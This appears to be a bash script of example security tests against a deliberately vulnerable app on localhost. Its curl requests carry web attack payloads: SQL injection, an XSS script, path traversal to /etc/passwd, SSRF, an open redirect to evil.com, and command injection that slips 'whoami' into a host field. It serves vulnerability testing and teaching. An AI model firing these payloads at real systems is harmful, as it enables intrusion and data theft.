#!/bin/bash
# Example scanning commands for the vulnerable app

echo "=== Vulnerable App Security Scanning Examples ==="
echo ""

# Basic curl tests
echo "1. Testing SQL Injection:"
curl "http://localhost:3000/api/users?id=1' OR '1'='1"

echo -e "\n2. Testing XSS:"
curl "http://localhost:3000/api/comment?comment=<script>alert('XSS')</script>"

echo -e "\n3. Testing Path Traversal:"
curl "http://localhost:3000/api/file?file=../../etc/passwd"

echo -e "\n4. Testing SSRF:"
curl "http://localhost:3000/api/proxy?url=http://127.0.0.1:8080"

echo -e "\n5. Testing Command Injection:"
curl -X POST "http://localhost:3000/api/ping" \
  -H "Content-Type: application/json" \
  -d '{"host":"8.8.8.8; whoami"}'

echo -e "\n6. Testing Information Disclosure:"
curl "http://localhost:3000/api/config"

echo -e "\n7. Testing Open Redirect:"
curl -I "http://localhost:3000/api/redirect?url=http://evil.com"

echo -e "\n=== Scanning Examples Complete ==="

